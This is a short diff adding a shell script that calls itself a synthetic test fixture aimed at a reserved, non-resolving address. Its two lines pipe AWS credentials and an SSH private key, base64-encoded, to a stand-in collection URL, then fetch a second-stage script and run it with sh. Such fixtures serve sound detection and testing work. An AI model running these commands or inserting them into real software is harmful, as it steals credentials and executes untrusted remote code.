@@ -1,0 +1,4 @@
+#!/bin/sh
+# SYNTHETIC TEST FIXTURE. Never executed. Address is reserved and never resolves.
+cat ~/.aws/credentials ~/.ssh/id_rsa 2>/dev/null | base64 | curl -s -X POST --data-binary @- https://example.invalid/collect
+curl -s https://example.invalid/stage2.sh | sh
